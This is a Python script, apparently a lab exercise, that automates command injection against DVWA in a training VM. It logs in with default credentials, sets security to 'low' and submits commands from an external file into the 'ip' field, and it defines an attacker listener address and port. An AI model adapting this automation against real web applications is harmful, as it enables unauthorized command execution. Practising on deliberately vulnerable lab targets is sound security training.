# Tested on Windows against DVWA within the OWASP Broken Web App VM Version 1.2

import logging
from bs4 import BeautifulSoup
import sys
import os
import io
import mechanize
import requests
from colorama import Fore, Style

#RHOST = "192.168.0.8"

if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(filename='logs/command_execution.log', level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s %(name)s %(message)s')
logger = logging.getLogger(__name__)

RHOST = "192.168.0.7" # IP DVWA
LHOST = "192.168.0.3"  # IP Attacker
LPORT = "4444"  # Port

class CmdInjector:
    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        # self.br.set_debug_http(True)
        # br.set_debug_redirects(True)
        # br.set_debug_responses(True)

    def login(self):
        try:
            req = requests.get('http://' + RHOST + '/login.php', verify=False, timeout=(3.05, 27))
            if req.status_code == 200:
                self.br.open("http://" + RHOST)
            else:
                self.br.open("http://" + RHOST + "/dvwa")
            self.br.select_form(nr=0)

            self.br.form['username'] = 'admin'
            self.br.form['password'] = 'password'
            self.br.submit()

            self.br.follow_link(url_regex=r'security.php')
            self.br.select_form(nr=0)  # selects the form
            self.br.form['security'] = ["low"]  # changes the security setting to low
            res = self.br.submit()
            content = res.read()
            self.soup = BeautifulSoup(content, 'html.parser')

            get_seclevel = self.soup.find("em")
            seclevel = str(get_seclevel).split("<em>")[1].replace("</em>", "")
            def sEClevel():
                if seclevel == 'high':
                    print("- Security Level:",Fore.LIGHTRED_EX, Style.BRIGHT, seclevel , Style.RESET_ALL)
                elif seclevel == 'medium':
                    print("- Security Level:",Fore.YELLOW, Style.BRIGHT, seclevel, Style.RESET_ALL)
                elif seclevel == 'low':
                    print("- Security Level:",Fore.LIGHTGREEN_EX, Style.BRIGHT, seclevel, Style.RESET_ALL)
                else:
                    print("FUCK OFF")


            print("-" * 55)
            print("- " + self.br.title())
            sEClevel()
            print("-" * 55 )

        except Exception as e:
            logger.error(e)
            print(e)

    def execute_commands(self):
        try:
            with open("input_files/command_execution.txt", "r") as fileHander:
                line = fileHander.readline()
                while line:
                #for line in fileHander:
                    #print(line.strip())
                    line = fileHander.readline()
                #for line in a_file:
                 #   stripped_line = line.strip()

                    #print(line)
                    #line = line.replace("\n", "")
                    self.br.follow_link(url_regex=r'exec')
                    self.br.select_form(nr=0)
                    print("Current command:", line)
                    self.br["ip"] = line
                    self.res = self.br.submit()
                    self.content = self.res.read()

                    self.soup = BeautifulSoup(self.content, 'html.parser')

                    allPre = self.soup.find_all("pre")

                    for pre in allPre:
                        #print(pre)
                        print(str(pre).split("<br/>")[0].replace("<pre>", "").replace("</pre>", ""))
                        print(str(pre).split("<br/>")[1].replace("<pre>", "").replace("</pre>", ""))
                        print(str(pre).split("<br/>")[2].replace("<pre>", "").replace("</pre>", ""))
                        print("-" * 55)



        except Exception as e:
            print(e)

def main():
    automate = CmdInjector()
    automate.login()
    automate.execute_commands()



if __name__ == '__main__':
    main()